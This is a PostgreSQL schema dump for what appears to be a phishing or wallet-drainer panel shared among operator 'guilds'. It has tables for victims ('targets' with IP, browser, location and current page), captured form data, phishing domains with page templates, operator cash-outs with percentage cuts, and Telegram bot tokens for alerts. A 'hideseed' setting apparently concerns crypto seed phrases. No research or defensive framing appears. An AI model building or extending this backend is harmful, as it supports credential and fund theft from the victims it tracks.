-- PostgreSQL database dump

DROP TABLE IF EXISTS public.users CASCADE;
DROP TABLE IF EXISTS public.guilddomains CASCADE;
DROP TABLE IF EXISTS public.cashouts CASCADE;
DROP TABLE IF EXISTS public.captured CASCADE;
DROP TABLE IF EXISTS public.targets CASCADE;
DROP TABLE IF EXISTS public.captureddata CASCADE;
DROP TABLE IF EXISTS public.guildsettings CASCADE;
DROP TABLE IF EXISTS public.admins CASCADE;

--
-- Name: users; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.users (
    username text NOT NULL,
    userid text,
    password text, -- Should store a salted hash, not plain text
    rank text,
    starting_page text,
    guild text
);


ALTER TABLE public.users OWNER TO postgres;

--
-- Name: guilddomains; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.guilddomains (
    id integer NOT NULL,
    url text,
    template text,
    guild text
);


ALTER TABLE public.guilddomains OWNER TO postgres;

--
-- Name: guilddomains_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.guilddomains_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.guilddomains_id_seq OWNER TO postgres;

--
-- Name: guilddomains_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.guilddomains_id_seq OWNED BY public.guilddomains.id;


--
-- Name: cashouts; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.cashouts (
    id integer NOT NULL,
    username text,
    amount numeric,
    percentage_cut numeric,
    date_registered timestamp without time zone,
    status text,
    guild text
);


ALTER TABLE public.cashouts OWNER TO postgres;

--
-- Name: cashouts_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.cashouts_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.cashouts_id_seq OWNER TO postgres;

--
-- Name: cashouts_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.cashouts_id_seq OWNED BY public.cashouts.id;




--
-- Name: guilddomains id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.guilddomains ALTER COLUMN id SET DEFAULT nextval('public.guilddomains_id_seq'::regclass);


--
-- Name: cashouts id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.cashouts ALTER COLUMN id SET DEFAULT nextval('public.cashouts_id_seq'::regclass);


--


--
-- Name: users users_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.users
    ADD CONSTRAINT users_pkey PRIMARY KEY (username);


--
-- Name: guilddomains guilddomains_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.guilddomains
    ADD CONSTRAINT guilddomains_pkey PRIMARY KEY (id);


--
-- Name: cashouts cashouts_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.cashouts
    ADD CONSTRAINT cashouts_pkey PRIMARY KEY (id);


--


--
-- Name: targets; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.targets (
    id uuid NOT NULL,
    ip text,
    status text,
    currentpage text,
    browser text,
    location text,
    belongsto text
);


ALTER TABLE public.targets OWNER TO postgres;

--
-- Name: targets targets_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.targets
    ADD CONSTRAINT targets_pkey PRIMARY KEY (id);


--
-- Name: captureddata; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.captureddata (
    id integer NOT NULL,
    targetid uuid,
    page text,
    captureddata jsonb
);


ALTER TABLE public.captureddata OWNER TO postgres;

--
-- Name: captureddata_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.captureddata_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.captureddata_id_seq OWNER TO postgres;

--
-- Name: captureddata_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.captureddata_id_seq OWNED BY public.captureddata.id;


--
-- Name: captureddata id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.captureddata ALTER COLUMN id SET DEFAULT nextval('public.captureddata_id_seq'::regclass);


--
-- Name: captureddata captureddata_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.captureddata
    ADD CONSTRAINT captureddata_pkey PRIMARY KEY (id);


--
-- Name: guildsettings; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.guildsettings (
    guild text NOT NULL,
    hideseed boolean,
    telegram_bot_token text,
    telegram_chat_id text
);


ALTER TABLE public.guildsettings OWNER TO postgres;

--
-- Name: guildsettings guildsettings_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.guildsettings
    ADD CONSTRAINT guildsettings_pkey PRIMARY KEY (guild);


--
-- Name: admins; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.admins (
    username text NOT NULL,
    password text, -- Should store a salted hash, not plain text
    guild text DEFAULT 'default'::text
);


ALTER TABLE public.admins OWNER TO postgres;

--
-- Name: admins admins_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.admins
    ADD CONSTRAINT admins_pkey PRIMARY KEY (username);

--
-- Foreign Keys
--

ALTER TABLE ONLY public.targets
    ADD CONSTRAINT targets_belongsto_fkey FOREIGN KEY (belongsto) REFERENCES public.users(username) ON DELETE CASCADE;

ALTER TABLE ONLY public.cashouts
    ADD CONSTRAINT cashouts_username_fkey FOREIGN KEY (username) REFERENCES public.users(username) ON DELETE SET NULL;

ALTER TABLE ONLY public.captureddata
    ADD CONSTRAINT captureddata_targetid_fkey FOREIGN KEY (targetid) REFERENCES public.targets(id) ON DELETE CASCADE;

--
-- Indexes
--

CREATE INDEX targets_belongsto_idx ON public.targets USING btree (belongsto);
CREATE INDEX cashouts_username_idx ON public.cashouts USING btree (username);
CREATE INDEX captureddata_targetid_idx ON public.captureddata USING btree (targetid);


--
-- PostgreSQL database dump complete
--
